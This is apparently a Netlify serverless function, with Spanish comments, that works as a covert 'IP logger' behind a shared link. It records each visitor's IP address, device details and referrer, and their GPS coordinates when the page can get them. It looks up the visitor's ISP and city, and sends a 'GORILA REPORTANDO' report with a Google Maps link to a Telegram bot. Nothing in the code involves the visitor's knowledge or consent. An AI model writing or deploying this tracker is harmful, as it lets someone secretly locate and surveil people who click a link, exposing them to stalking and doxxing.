const axios = require('axios');

exports.handler = async (event) => {
    const clientIP = event.headers['x-nf-client-connection-ip'] || event.headers['client-ip'];
    const userAgent = event.headers['user-agent'];
    const referrer = event.headers['referer'] || 'Clic directo / Enlace pegado';

    try {
        // Parsear los datos que vienen del index.html
        const bodyData = JSON.parse(event.body || "{}");

        // 1. Obtener datos base de la IP e ISP
        const ipInfo = await axios.get(`http://ip-api.com/json/${clientIP}?fields=status,country,regionName,city,isp,lat,lon`);
        const data = ipInfo.data;

        let reporteUbicacion = "";
        let googleMapsApp = "";

        // 2. Lógica de Ubicación (GPS vs IP)
        if (bodyData.lat && bodyData.lon) {
            reporteUbicacion = "🎯 PRECISA (GPS)";
            googleMapsApp = `https://www.google.com/maps?q=${bodyData.lat},${bodyData.lon}`;
        } else {
            // Respaldo por IP si el GPS falla
            const city = data.city || "Desconocida";
            const country = data.country || "Desconocido";
            reporteUbicacion = `☁️ APROXIMADA (IP) - ${city}, ${country}`;
            googleMapsApp = `https://www.google.com/maps?q=${data.lat},${data.lon}`;
        }

        // 3. Limpiar el User Agent para mostrar el modelo (si es posible)
        const dispositivoSimple = userAgent.split('(')[1] ? userAgent.split('(')[1].split(')')[0] : "Desconocido";

        // --- ESTRUCTURA DEL MENSAJE GORILA ---
        let mensaje = `🦍 *¡GORILA REPORTANDO!* 🦍\n\n`;
        mensaje += `🔑 *IP:* \`${clientIP}\`\n`;
        mensaje += `📍 *Ubicación:* ${reporteUbicacion}\n`;
        mensaje += `📡 *ISP:* ${data.isp}\n`;
        mensaje += `📱 *Sistema:* ${dispositivoSimple}\n`;
        mensaje += `🔗 *Origen:* ${referrer}\n`;
        mensaje += `🗺️ *Mapa:* [Ver Ubicación](${googleMapsApp})`;

        const token = process.env.TELEGRAM_TOKEN;
        const chatId = process.env.TELEGRAM_CHAT_ID;

        await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
            chat_id: chatId,
            text: mensaje,
            parse_mode: 'Markdown',
            disable_web_page_preview: false
        });

        return { statusCode: 200, body: "OK" };

    } catch (error) {
        console.error("Error en el logger:", error);
        return { statusCode: 500, body: "Error" };
    }
};